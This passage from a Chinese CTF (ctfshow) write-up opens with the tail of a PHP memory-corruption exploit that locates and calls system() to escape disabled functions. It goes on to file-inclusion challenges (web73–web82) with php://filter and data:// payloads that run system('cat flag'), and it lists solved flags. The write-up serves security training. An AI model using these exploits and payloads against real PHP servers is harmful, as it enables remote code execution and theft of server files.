class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>    <span class=\"token variable\">$closure_obj</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>    <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_handlers</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't determine binary base address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$elf</span> <span class=\"token operator\">=</span> <span class=\"token function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't parse ELF header\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get basic_functions address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$zif_system</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get zif_system address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre></pre></td></tr><tr><td data-num=\"188\"></td><td><pre></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>    <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xd0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x110</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">,</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_obj</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre></pre></td></tr><tr><td data-num=\"194\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$fake_obj_offset</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"196\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$zif_system</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"197\"></td><td><pre></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre></pre></td></tr><tr><td data-num=\"202\"></td><td><pre><span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat /flag0.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">ob_end_flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><pre><code>ctfshow&#123;434f032d-5f1b-451a-9c5c-b090d734d653&#125;\n</code></pre>\n<h2 id=\"web73\"><a class=\"anchor\" href=\"#web73\">#</a> web73</h2>\n<pre><code>新知识var_export()\n\npayload:\nc=var_export(scandir('/'));exit();\nc=include('/flagc.txt');\n</code></pre>\n<pre><code>ctfshow&#123;48365bc1-67eb-479a-9f3e-55675d4d9b89&#125; \n</code></pre>\n<h2 id=\"web74\"><a class=\"anchor\" href=\"#web74\">#</a> web74</h2>\n<p>止步于此</p>\n<h1 id=\"文件包含\"><a class=\"anchor\" href=\"#文件包含\">#</a> 文件包含</h1>\n<h2 id=\"web78\"><a class=\"anchor\" href=\"#web78\">#</a> web78</h2>\n<p>文件包含系列开始</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 10:52:43</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-16 10:54:20</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>payload:\n?file=php://filter/read=convert.base64-encode/resource=flag.php\n</code></pre>\n<pre><code>ctfshow&#123;9af9735a-bd46-4605-ac75-b394be6da3cd&#125;\n</code></pre>\n<h2 id=\"web79\"><a class=\"anchor\" href=\"#web79\">#</a> web79</h2>\n<p>文件包含系列开始</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:10:14</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-16 11:12:38</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>将php替换成???，data://伪协议绕过即可\n\npayload：\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\nPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\t//&lt;?php system('cat flag');\n</code></pre>\n<pre><code>ctfshow&#123;5d32ac0e-6caf-4f29-8b9c-1f18d2984b65&#125;\n</code></pre>\n<h2 id=\"web80\"><a class=\"anchor\" href=\"#web80\">#</a> web80</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-16 11:26:29</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230215132610547.png\" alt=\"image-20230215132610547\" /></p>\n<p>日志包含注入漏洞即可</p>\n<pre><code>ctfshow&#123;4cdc8e27-0c24-4173-840c-223a72d9fd74&#125;\n</code></pre>\n<h2 id=\"web81\"><a class=\"anchor\" href=\"#web81\">#</a> web81</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-16 15:51:31</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230215133628740.png\" alt=\"image-20230215133628740\" /></p>\n<p>同日志包含注入即可</p>\n<pre><code>ctfshow&#123;974ebae8-9353-4c02-b82b-5b3893384219&#125;\n</code></pre>\n<h2 id=\"web82\"><a class=\"anchor\" href=\"#web82\">#</a> web82</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-16 19:34:45</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><h2 